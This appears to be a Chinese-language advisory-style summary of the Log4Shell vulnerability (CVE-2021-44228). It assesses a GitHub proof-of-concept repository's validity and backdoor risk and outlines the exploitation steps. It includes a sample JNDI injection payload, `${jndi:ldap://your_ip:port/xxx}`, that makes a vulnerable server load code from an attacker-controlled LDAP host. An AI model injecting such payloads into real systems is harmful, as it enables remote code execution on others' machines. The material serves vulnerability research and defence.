## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和完全系统控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，且允许外部JNDI查找

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个存在于 Apache Log4j2 中的严重远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 功能执行从 LDAP 服务器加载的任意代码。该漏洞利用 JNDI 注入，攻击者将包含恶意 JNDI 查找的字符串发送到应用程序，Log4j2 解析并执行该字符串，从而导致远程代码执行。

**有效性：**
提供的POC代码有效。它展示了如何使用 JNDI 注入漏洞利用 Log4j2。该代码提供了一个简单的 Spring Boot 应用程序，用于触发漏洞，并提供了一个利用有效载荷的示例。

**投毒风险：**
此仓库中作者隐藏投毒代码的风险较低。`README.md` 中提示的payload执行的是打开计算器程序的操作，虽然不是恶意操作，但仍需警惕。另外，`pom.xml` 文件声明依赖了 `log4j-api` 和 `log4j-core` 2.14.1版本，这是一个受漏洞影响的版本，为复现漏洞提供环境。`VulController.java` 中定义了触发漏洞的端点 `/vul`，并使用 `log.info` 记录请求参数。这个简单的应用程序本身不包含任何隐藏的恶意代码，仓库目的是复现CVE-2021-44228。 但无法完全排除作者添加了不易察觉的后门的可能。风险评估为 10%。

**利用方式：**
利用方式如下：
1.  攻击者找到一个使用了 Log4j2 且允许外部 JNDI 查找的应用程序。
2.  攻击者将一个包含恶意 JNDI 查找的字符串（例如 `${jndi:ldap://your_ip:port/xxx}`）注入到应用程序可以记录的任何输入字段（例如 HTTP Header、POST 参数等）。
3.  当 Log4j2 尝试记录该字符串时，它会解析 JNDI 查找，并尝试连接到攻击者控制的 LDAP 服务器。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

**项目地址:** [x1ongsec/CVE-2021-44228-Log4j-JNDI](https://github.com/x1ongsec/CVE-2021-44228-Log4j-JNDI)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)